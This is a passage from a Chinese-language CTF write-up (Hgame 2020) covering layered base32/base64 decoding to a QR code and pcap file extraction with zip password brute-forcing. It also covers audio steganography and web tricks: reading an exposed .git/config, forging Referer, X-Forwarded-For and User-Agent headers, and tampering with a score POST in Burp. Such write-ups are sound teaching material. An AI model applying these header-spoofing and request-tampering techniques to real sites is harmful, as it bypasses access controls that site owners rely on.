MTDOORHDC3TEHFFFKWLEKY4XC3SPNVGHA4CEJUZFQOJWNZUXAYZZOJ2XG6TUOBYXERDRKB2FKNKVPBTE4322NV4WM3SXHAYUI3DUHE4W2ZCOIZLFSZC2F5YW4S3NJQ2XIQSNK5RDQNSYOVYWG5DWOZZVI4DPOFZEY4CQMRRTOVKSLBHG64DRPBTEQUZZGFKHI5BZMRUWITSGKZRGI4D2OBXDM4KJGVHEMUCXOI2DMWCPOFTHIUDSOVKHAZ3SOI3HMTKXPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3ZUGNUEOULDM4YG6MKOIRMGIZCTKZZG6UKSIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFAUMRCLIFJEI4KBJZCHCQKGIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFBUQYKFI42TKM2ZJZ4UOSLDPFLHESTNOQ3XU5DFKNFHK2TCNFYHGWDCNJFVOTLMMEZWETBSGU2G4NDUMFEW26DQOJHDKNDZKZZEU3LUG55HIZKTJJ2WUYTJOBZVQYTKJNLU23DBGNREYMRVGRXDI5DBJFWXQ4DSJY2TI6KWOJFG25BXPJ2GKU2KOVVGE2LQONMGE2SLK5GWYYJTMJGDENJUNY2HIYKJNV4HA4SOGU2HSVTSJJWXIN32ORSVGSTVNJRGS4DTLBRGUS2XJVWGCM3CJQZDKNDOGR2GCSLNPBYHETRVGR4VM4SKNV2DO6TUMVJUU5LKMJUXA42YMJVEWV2NNRQTGYSMGI2TO3RZOBTHOQ3TMN3WYYSVGUVW4VDQIFTCWQTVNNKWWSDXINDUCTRZIEZVGS2TIR3UERDHI4VWOYTIJBFEENCBNB3UIZCROQ2GU22BHBAVCNCCOVXVOMCUPFAVOQKJHBATGVKMKNGDKQKEIFCSWQLCOFDHARRYIFBGOQ3GIFHDC2JQM4VUCQLXIJ3HISBLOAVUUMSZLFRGYU2GGFQWYN3CMRSWU2DJJJSTSMRZGU3HI2CTJBMSWMKUK42WK2CUK5NHG2SWOZFHKZBLF5NFO2DJIN3FKOLMLBMTIK3MMJKTKWLJLB3GI5TFMVZFSVLIGJIHIVJROVMG6VJRNVRESMLCPFRG4ZTWGJLG6WLHOIYVAWSWGJHVA4CXGFHVOSLMG4ZWEM3OOEZEMSLENI3VMTTCNQ3EMTS2NV4U4VZYNU2TGNZZNRQUOSKLHFKDEVTENJVDMVTUKRWGSSTFHEZDSNJWORUFGSCZFMYVIVZVMVUFIV22ONVFM5SKOVSCWL22K5UGSQ3WKU4WYWCZGQVWYYSVGVMWSWDWMR3GKZLSLFKWQMSQORKTC5KYN5KTC3LCJEYWE6LCNZTHMMSWOBUVCMKEI5UWQWLUHFDEEY3FNZKDGMCKGFIG4VCOKZZTOVLXNBFDSSKYKRJVQSDUGA4WIT3EKQ2TA6SWMJBTATJUKNSFGRRYGJWFEM3DKAZWM3SVJ5LE2MKXO52EIK2JNZKVEWCQOAYGIMKEMR5DKML2NRKE4MLTJFIWM2KKGEYFM6BWMRIGMULOKUVWITJRK55HIVCDIVXDA2DEJZFGGZJTKQYTANJRKBXFITSWONGFC6TIJIYUSWD2MFLEQZDXF5SCWZCRGVKXUVTCIMYFANDJMRJEMYZLNZJDGVKOGNIG4WCPKZGTGV3XNBBCWSLOLBJFQSDQGA4TSQ3EKQ2TA6SWMJHTCTTHGFBFGZSLM5GECTLXGVEFE33QON5FUSCXOVMEKM2ZIRIXS2BWIRVDEVKKJUVXATZZLF2UUK3XI5UGYRBQJBEG632TLI2VIZBWPBSFI5DHJZCEWSDPJ5TFEULLNJ4W4N3MNE3W4TCBMJDUKTCSMMVWS2CKJBWE6M3CIYZE6V2FGNGUSU3JGU4UERCTMZFWG5LNKB2GG42KOVMUC2CGPI3EOSDLOVITKZDDMZQTKWKUMR3UEQ2LNZVU2UCKMNWHUNTPGYYXS53NG5TVGRKVKBMWGZKTOBGG4MKCGFZGY6COGJATATLPMVTTIOLMINKFA4KUOZLUY2LGONJHM5LWPE4XKRTIKI3UWYTNGNFHAR3RMJXEITRRPJ5EGRKJLFHEWSTMLBRDKSTZOBSTIWLIIRBGYVKNOFXGCSTVMRGTGVCNJVMWG2LHNNVW4VSONJWG4NTQGVUEGRKNI5WFK6LRORZWWNKVF5RU2ULYM54XCR2SKN2FKM2PNVRHA3SHJVFVCUKTK5KHC3JRPF5HIUJZO54EGR2EINYVUVSHGJKGGNTCOVDVSWLXLJDEISTQI5YWE3SEJYYXU6SDIVEVSTSLJJWFQYRVJJ4XAZJTMFHESVDIKE4XA3JYGNATM22TPB2DQ6CFN53UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZZXOQSEJVMVC2BQLF3W443XIJCE2WKRNAYFS53OON3UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZ2GSRCVJBNGORCMK5BWGZDQI5MHA332NBHTAVSXJNNFKM3DIR4WY2JXHBJHQRCUGE3WCMKKO5XGCS3WIVGXCZTVIJYFG6DEOVGTK2DQGY4HIS3LGVKDSQSXNFLVMTZTKEYG6WJLGNDWG53XHFSVO3CUMM2TMZ3SKJGEY3SMN5RFKTLCMFVGKY2ZMV3EYU3QOVMTQUKWONWGY2TMGFHDMQ2NORJHMUCNMZKGW4CVGNHGKWKLGJJWS6D2GZWTKQKHK5ZTG3TNKBXXSVLVMJWXMTKFMJNFMWJVORKGIZ2EJRLWE2T2JAYEUT2YJZVFQ3SDMRXXC43DPFYHK52GNRZE4MJUNJYUK3SMGIYXC6TIJ4YFMV2LLJKTGY2EPFWGSNZYKJ4EIVBRG5QTCSTXNZQUW5SFJVUWI3CZMQYU43TQIJKHSWCUJZWE2Z2QKJQXQSBWOA2WQQ2FJVDTCWRTKRXVU22TFNQUOSJZKVVGITLXPBUHSS2DGZRXU3ZQKV4USL2GJRCWK4KYOVDUSULXLJLEQZCPNAZFUSZVJFRWSMLJJYYXU6SDIVEVSUDRPJ2W4UKUJFXDQVKNKI3HATZULJUGUQTLKVHDANKILJXXA22SFNFVOSJPKVIGGTKRNBTXS4KPGZSEITLZLB4VC6CIOJVWE4DOI5GUWUKRLBMG4ZCHNFWVESBUN5MWUMKTHF3XQRCHIRFW6N3QO5HXUWSUJFCDAV3TKIVXCZKZKFUEIQTUK5SDANSHLJCXM3LINFIFMSJTMJIDEWBVMRIEKTZSI5XE23RRMQ4WKMKXHFZVET3BLBBE2SKSNJRWSYSYMY4DC6CZM5TVSULLOJHTKUDROZHVKNCNIFKU4SLZLJWGGL32LBEGSU2GM5BUG2ZVNMVXKLZVNJTXQQSBO5UEUV3EPEXWIY3DJI2GCQKJMFKGWVCLG4XW25KQIVCUIQ2FNRFHUSRZKY4XU3SCM5BWQ4CDKNGTO3RLME2DI6RRKJBW2RBYOJ4EQUCVNY2SW6LVGY2FGWSPHBAVC2DJPJEDSST2MRSFUMDXMN3WGWLXOBCGY3KKGZ5HKNRUKRNHKNCBKF4GS6KIJZHHUZDUMQYXO43XMRMUC2CENRWU4NT2OU3DMVDQNE2UC53YNB4UQSSNPI4WYZBRO5VXUZBUIFUEIRTNJ43FI3JXGZ5HA2BVM42HO2CDJBGE2VBRNZSDCMDOPJHHOQTINJBGWT3BMJXDOSZXOJUEU2ZXO5BEGR2MJVTDA3SOGEYW4VCCPJBDKNTTIY4EG2JPKZRGENKQOBKDMM3RGFITIVZRLBTTERZYIZ2HI2ZLORIHEULUIRBUCQSEFNFTEMTZMZLW4MLPKVUEESKBNAXUMYTCGVIHAVBWHBEVCQLTIFIWM4LUORRXMMTQMRLUKSKBK5AUS5RZKUZHKZRXKV2WUQ2FIFCEGRJTGJYWEWCIHFYVQUTIINAUE2SDMI3VMTTSNIVTCTDHO5UECQL2NB2DS33NGE2TSYLMHF3VC3CNJU4DIWCWOI2XGQSSNUYE4L3EK4ZHAYRXOZIEOOCSO5UU642ZOBUEUSDCKE3TSMLCK5WHM5JQFNRHQRCEJFQTK2TNIVXWG5CUNYYFMOLFK4VXEYRXOZCUKTLIG5UU6WKTOB4DCT3CKFMDCMLCGZ2HM5JYO5MXQSCPJE3GQ4LOIVKVU5CEMYZVM5DRK4VTO6TYOZCWGSLKOJDUWWKTKIZDATZPMRLTC4DCG52FA3JYKF3XSR3VLE2WQS2IJRKTKOKGMZMGY5TRGIVTO6CCIREWKNDKNVCXCY3EKRWTARRZMRLSW4TCG53E2R2NKJ5GST3PMFYHQRSHMJITGOJRMJQWY5TVHA4GE6CIINETM6DJNVCWWZDUIR3DGVTUMFLSWN2UGRSDI4LBKNSWOVDRFNUDANLVGJHXA5KVKV5EIT2FIJUG4RCXMNUXKNKSKRGU2NCRI5DWGTS2PFFTO3CGJV3XU2CBLFNHOMLOJFZHKVKVPJCE6RKCNBXEIV3DNF2TKUSUJVGTIUKHI5RU4WTZJM3WYRSNO55GQQKZLJ3TC3SJOJ2VKVL2IRHUKQTINZCFOY3JOU2VEVCNJU2FCR2HMNHFU6KLG5WEMTLXPJUECWK2O4YW4SLSOVKVO6TENNHFCTDNGN4WG2LUPJYXK5BTMFFHIYLGG5FG2M3GOF3GQU2HKU4WC3SNOFQTOZTPK4YXCL3DNVQWIZLVF5DG6WSRGFYWG6LQG5YCW2BXMFYDSU3EOIYXCMZPK5UGQQ2XLIXUW3SPOI3EQZDRNUYXAK3TK5RGMK3BGJCUSWSYGBYWGNTSOJSDE2LCK5XCW6K2OQZTM4RUKVUGYUCXOB5EW3LVGM3EM5DBOYZUU3LOLBZHM6DBI5KU4YLOJVYWKNTGN5STE4LGKVXGCOLBOQXTC32ZKFWG2ZTZOB5HCK3IGNQXA5DBMZZEM3JTF5WXI2CDI5LDSS3OJ5YTMM3EN5WTC4BPONWWEZBLOEVUMSLEIRXHOS3DNNSWKWKPJVAVINSIKBSVKSSNF5RUCWK2IFXCWT3FNN2VGWSPHBAVCNSIKBRVKNKJHBRXOY2ZIFXDET3FGBYVGWRLGRAVCNSEKBRVKOKKHBZXOZCZIFVDAT3FGRYFGWRWGVAXO6KCKBZWGOKKMNVXUZBUIFUDAT3FGRYHSURVGVTTI52CKBXWGOJVKFVXUOLXIJUGYRCVLJ5EY5LHFM3FS4BSOMZXQ5TGLJXFIUSWK5EFOZTZMJTU6ZLGKNUDGTSKNZSDSSSVLFSFMOKKOVGTMNKOI5EGG23VMYZVK3CUNBLFQM3NLF5HE22FMNTHS2JRHFSGSZCOIZLGEZC2PJFXKULYGU4UWTDGGAZFUMBQKZLGQMLOHBWTIRDONYYG6ZD2KNNDGZSTKZDUQVTGKNRGUT3VKRJGQM2KJRXDSMKKKU2FMVRZGVWU2NRVIJEEQODPORTFQWLOKRJFMVZTK5RXS4TLJVSWMU3JGM4U43LEJZDFMWLELIXUU5KBGU2TSS2IMMYHCY3KMFJXC4DHGNEWMWKOOJZDC3RLLBCSWNCFKEZWSULVOBCHKQJQPA3TGZTSOZRXGS3ELFAWOUCVNBTFGZSZIJYHEMLWF5MFKNRUIV3XU2CRMVYEG5LHHB3TOWCYOJ3DQ42KMQ2ES2CQIVUGIU2QMNBHA4RROUXVQYZVGRKTI53IIFSXAQZLNMVXOTCULBZGMODVJI4XOSTIOZAWOZCTJBSEENLKGJ2XMWDGGVMVCN3XKJAWK4CDGZVSW52EKRMHEZRLOU2XQ52KPBVEGZZZKNDGIQRZM4ZHK5SXMY2WGVBXNNJHCQ2MMM4HAV22JN2W45BQGFSWE3ZYGVYWGM2ZK5SDQSSTMFFVQRLTNNFU2MSSGUXVQNKPO52TOSKTNYYUK6KKLE2EKY3UKRXDM5SDLJXGIMSFNZIEWVTNKNUHOTBVJNVE4MDFMMYU6YTTJRHSWRLQJZLFA2KXINBEQYSZGQVXEODOLJMGIZ2KKQ3G2WSFONRUGT2XOB5DSSDMJZ5HKN2DKRXGQS32LJITIRTTNBJG2NSQKBQTGSRSIYZWEQ2VGJYW26CMIZAWU5DPMNTFMNSUOM3XK52FGU2VGTLZK5HUEWCMKU2XK2T2NVYHUZDILIZXO3CKN5YGGU3ZKFXXUWSINY4WM2ZTKA2FGQKJGREFC52DIFCHQZ2DIFEHUQKFIFCGOQJULFAUCQRYO5BECRBUM5BUKQLXIFRU2QKRIEVVSQLHIE4ECRSEIFEUCUBPO5AUM3ZQNBKVU4TIGFWUCQKBIFAUESSSKU2UK4TLJJTWOZZ5HU======</code></pre><p>再base32解密得到</p><pre><code>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</code></pre><p>一看结尾<code>==</code>，应该是base64编码，于是继续解密。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_signinProPlus.png" alt="base64解密"></p><p>噫是个PNG图片。加上头补全 <code>data:image/png;base64,</code>。草（一种植物），真会玩，是个二维码。</p><p>（也可以base64解密后保存为二进制文件然后打开。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_signinProPlus2.png" alt="二维码图片"></p><p>扫码得到flag：</p><p><code>hgame{3Nc0dInG_@lL_iN_0Ne!}</code></p><p>真的会玩2333（（<em>好，我也要整一个各种编码的嘻嘻嘻</em></p><blockquote><p><em>Reference:</em><br><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/kaisamima.php</a><br><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a>   </p></blockquote><hr><h3 id="每日推荐"><a href="#每日推荐" class="headerlink" title="每日推荐"></a>每日推荐</h3><p>得到一个<code>.pcapng</code>抓包文件，用Wireshark打开，查看http，发现应该是与wordpress博客相关。</p><p>利用“文件-导出对象-HTTP”，分析其中的对象。</p><p>结合题目提示</p><blockquote><p>ObjectNotFound正听着网易云每日推荐…</p></blockquote><p>发现了一个上传的网页——</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation1.png" alt="HTTP对象"></p><p>这是一个提交的表格，发现了上传的文件 <code>song.zip</code>，将其提取出来。</p><p>压缩包里果然是一首歌，且备注里提示是6位数字。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation2.png" alt="form"></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation3.png" alt="压缩包"></p><p>考虑到6位数字，直接就暴力破解好了。（其实还在抓包文件里找了老半天没找到（（（</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation4.png" alt="破解得到口令"></p><p>利用口令<code>759371</code>解压得到mp3文件。</p><p>一开始打开010editor找，没有。</p><p>foremost提取得到了封面图，也没有隐写。</p><p>看来在音频里了，猜想就是<strong>音频隐写</strong>嘛。</p><p>既然是MP3，先试试<code>MP3StegoDecode</code>，结果么得。</p><pre><code>the bit stream file I Love Mondays.mp3 is a BINARY fileHDR: s=FFF, id=1, l=1, ep=on, br=4, sf=3, pd=0, pr=0, m=0, js=0, c=0, o=0, e=0alg.=MPEG-1, layer=I, tot bitrate=128, sfrq=0.0mode=stereo, sblim=32, jsbd=32, ch=2[Frame    3]OpenTable: could not find tables/huffdecCheck local directory './tables/'Please check huffman table 'huffdec'</code></pre><p>上网找了一下，下了个音频处理软件<strong><em>Audacity</em></strong>。（免费开源跨平台，还不错</p><blockquote><p>Free, open source, cross-platform audio software. <em>Audacity</em> is an easy-to-use, multi-track audio editor and recorder for Windows, Mac OS X, GNU/Linux…</p></blockquote><p>查看频谱，得到flag：</p><p><code>hgame{I_love_EDM233}</code></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation5.png" alt="查看频谱图得到flag"></p><blockquote><p><strong><em>Electronic Dance Music</em></strong> <em>（电子舞曲）</em>可还行。</p><p>第一次做音频隐写的题，哇脑洞真大，太有意思了233333</p></blockquote><hr><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><p><a href="http://cosmos.hgame.n3ko.co/" target="_blank" rel="noopener">http://cosmos.hgame.n3ko.co/</a></p><p>先在网页里找了半天没找到emmm</p><p>后来发现，既然说<strong>版本管理工具</strong>，还有<strong>GitHub</strong>嘛。</p><p>那就构造<code>/.git/config</code>试试</p><p>果然——</p><pre><code>[core]    repositoryformatversion = 0    filemode = true    bare = false    logallrefupdates = true[remote "origin"]    url = https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc    fetch = +refs/heads/*:refs/remotes/origin/*</code></pre><p>好，这个GitHub仓库有戏！</p><p>访问一波，然后在commit里找到了flag。</p><p><img src="/2020/01/23/CTF_Hgame2020/web_Cosmos'sBlog.png" alt="web_Cosmos'sBlog"></p><p>base64解码得到flag</p><p><code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></p><blockquote><p>/.git目录公开访问是挺危险的emmm  </p></blockquote><hr><h3 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h3><p><a href="http://kyaru.hgame.n3ko.co/" target="_blank" rel="noopener">http://kyaru.hgame.n3ko.co/ </a></p><p>直接访问，提示</p><blockquote><p>You need to come from <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a>.                    </p></blockquote><p>增加请求头: <code>Referer: https://vidar.club/</code>，重发后提示</p><blockquote><p>You need to visit it locally.                    </p></blockquote><p>增加请求头：<code>X-Forwarded-For: 127.0.0.1</code></p><blockquote><p>You need to use Cosmos Brower to visit.                    </p></blockquote><p>改UA：<code>User-Agent: Cosmos</code></p><blockquote><p>The flag will be updated after 2077, please wait for it patiently.                    </p></blockquote><p>根据响应头 <code>Last-Modified: Fri, 01 Jan 2077 00:00:00 GMT</code>，进行修改。把 <code>If-Unmodified-Since</code> 设置在 <code>Last-Modified</code> 之后就可以了。</p><p>增加请求头：<code>If-Unmodified-Since: Fri, 01 Jan 2077 00:00:00 GMT</code></p><p>得到flag</p><p><code>hgame{W0w!Your_heads_@re_s0_many!}</code>                    </p><blockquote><p>这题一波三折啊。</p><p>最后这个操作让我想到了ustc的hackgame里<code>信息安全 2077</code>那道题，然后回去看了一下233.</p><p><strong><em>Reference：</em></strong></p><p><a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md" target="_blank" rel="noopener">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md</a></p></blockquote><hr><h3 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h3><p>cxk有点好玩2333</p><p><del>随便玩了一下觉得有点无聊（x</del></p><p>看了一下网页源代码，发现是用canvas画布画出来的，交互用的js，有点意思i。</p><p>然后打开了Burp Suite，抓个包看看吧。</p><p>发现游戏结束的时候会POST当前得分。</p><p>不够则提示</p><blockquote><p>Your score must more than 30000 , then you can get the flag. Happy game!</p></blockquote><p>那就截包改包好了啦，直接给他加个0.</p><p><img src="/2020/01/23/CTF_Hgame2020/web_cxk1.png" alt="改包"></p><p>这就出来了呀！</p><p><img src="/2020/01/23/CTF_Hgame2020/web_cxk2.png" alt="cxk2"></p><p>​    <code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></p><hr><h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><p><a href="http://codeworld.hgame.day-day.work/" target="_blank" rel="noopener">http://codeworld.hgame.day-day.work/</a></p><p>发现重定向到了 <a href="http://codeworld.hgame.day-day.work/new.php" target="_blank" rel="noopener">http://codeworld.hgame.day-day.work/new.php</a></p><p>同时看到了一句js</p><pre class=" language-javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!"</span><span class="token 